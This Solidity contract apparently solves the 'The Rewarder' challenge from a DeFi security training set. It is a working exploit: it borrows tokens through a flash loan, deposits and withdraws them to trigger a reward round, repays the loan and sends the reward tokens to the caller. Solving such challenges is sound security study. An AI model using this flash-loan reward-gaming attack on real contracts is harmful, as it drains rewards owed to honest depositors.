pragma solidity ^0.6.0;

import "../FlashLoanerPool.sol";
import "../TheRewarderPool.sol";
import "../RewardToken.sol";
import "../../DamnValuableToken.sol";

contract AttackerRewarder {

    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public liquidityToken;

    constructor(address flashLoanerPoolAddress,
        address rewarderPoolAddress,
        address rewardTokenAddress,
        address liquidityTokenAddress
    ) public {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) public {

        // Approve the deposit
        liquidityToken.approve(address(rewarderPool), amount);

        // Deposit the liquidity token and trigger new round
        rewarderPool.deposit(amount);

        // Withdraw the deposit
        rewarderPool.withdraw(amount);

        // Return the flash loan
        liquidityToken.transfer(msg.sender, amount);
    }

    function attack(uint256 amount) public {

        // Initiate the flash loan and trigger receiveFlashLoan()
        flashLoanerPool.flashLoan(amount);

        // Send reward tokens to attacker
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

}
